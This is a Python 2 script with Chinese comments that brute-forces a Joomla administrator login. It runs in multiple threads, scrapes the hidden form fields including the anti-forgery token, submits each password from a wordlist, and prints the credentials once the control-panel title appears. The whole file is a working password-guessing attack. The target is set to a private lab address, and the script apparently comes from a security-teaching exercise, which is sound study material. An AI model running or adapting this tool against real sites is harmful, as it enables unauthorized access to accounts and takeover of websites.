#-*- coding:utf8 -*-  
  
import  urllib2  
import  urllib  
import  cookielib  
import  threading  
import  sys  
import  Queue  
  
from  HTMLParser  import  HTMLParser  
  
#簡要設置  
user_thread =  10  
username = "giantbranch"  
wordlist_file = "./mydict.txt"  
resume =  None  
  
#特點目標​​設置  
target_url =  "http://192.168.1.105/Joomla/administrator/index.php"  
target_post =  "http://192.168.1.105/Joomla/administrator/index.php"  
  
username_field =  "username"  
password_field =  "passwd"  
  
#登陸成功後，title裡面就有下面的文字，注意是語言是英文才是下面的哦　  
success_check =  "Administration - Control Panel"  
  
class  BruteParser(HTMLParser):  
    def  __init__( self ):  
        HTMLParser.__init__( self )  
        self .tag_results = {}  
  
    #當我們調用feed函數時，他將整個HTML文檔傳遞進來並在遇到每個標籤時調用下面這個函數(根據函數名就容易理解)  
    def  handle_starttag( self , tag, attrs):  
        #判斷是否是input標籤  
        if  tag ==  "input" :  
            tag_name =  None  
            tag_value =  None  
            for  name,value  in  attrs:  
                #input標籤裡面不是有name,value,type等屬性嗎，這裡只判斷name和value  
                #不過我覺得第二個if是多餘的  
                if  name ==  "name" :  
                    tag_name = value  
                if  name ==  "value" :  
                    tag_value = value  
                if  tag_name  is  not  None :  
                    self .tag_results[tag_name] = value  
  
class  Bruter(object):  
    def  __init__( self , username, words):  
        self .username = username  
        self .password_q = words  
        self .found =  False  
  
        print  "Finished setting up for %s"  % username  
  
    def  run_bruteforce( self ):  
        for  i  in  range(user_thread):  
            t = threading.Thread(target= self .web_bruter)  
            t.start()  
  
    def  web_bruter( self ):  
        while  not  self .password_q.empty()  and  not  self .found:  
            #從字典獲取密碼，並去除右邊的空格  
            brute =  self .password_q.get().rstrip()  
            #使用FileCookieJar類，將cookie值儲存到文件，參數為文件名，可用於存取cookie  
            jar = cookielib.FileCookieJar( "cookies" )  
            #用上面的jar初始化urllib2打開器,這樣下面請求url時，就會把cookie值存到那個文件中  
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))  
  
            response =opener.open(target_url)  
  
            page = response.read()  
  
            print   "Trying: %s : %s (%d left)"  % ( self .username, brute,  self .password_q.qsize())  
  
            #解析隱藏區域(表單)  
            parser = BruteParser()  
            parser.feed(page)  
  
            #已經含有隱藏表單的鍵值  
            post_tags = parser.tag_results  
  
            #添加我們的用戶名和密碼區域  
            post_tags[username_field] =  self .username  
            post_tags[password_field] = brute  
  
            #輸出post的數據(鍵值)  
            # for key,value in post_tags.items():  
            # print key,':',value  
  
            #url編碼post的數據，開始嘗試登陸  
            login_data = urllib.urlencode(post_tags)  
            login_response =opener.open(target_post, login_data)  
            login_result = login_response.read()  
  
            # 判斷是否登陸成功  
            if  success_check  in  login_result:  
                #設置為True，讓循環結束  
                self .found =  True  
  
                print  "[*] Bruteforce successful."  
                print  "[*] Username: %s"  % username  
                print  "[*] Password: %s"  % brute  
                print  "[*] Waiting for other threads to exit..."  
  
def  built_wordlist(wordlist_file):  
    #讀入字典文件  
    fd = open(wordlist_file,  "rb" )  
    raw_words = fd.readlines()  
    fd.close()  
  
    found_resume =  False  
    words = Queue.Queue()  
  
    for  word  in  raw_words:  
        #刪除字符串末尾的空格  
        word = word.rstrip()  
        #如果是延續上一次  
        if  resume  is  not  None :  
  
            if  found_resume:  
                words.put(word)  
            else :  
                if  word == resume:  
                    found_resume =  True  
                    print  "Resuming wordlist from: %s"  % resume  
        else :  
            words.put(word)  
    return  words  
  
#構造字典  
words = built_wordlist(wordlist_file)  
  
#初始化Bruter類  
bruter_obj = Bruter(username, words)  
#調用run_bruteforce函數  
bruter_obj.run_bruteforce() 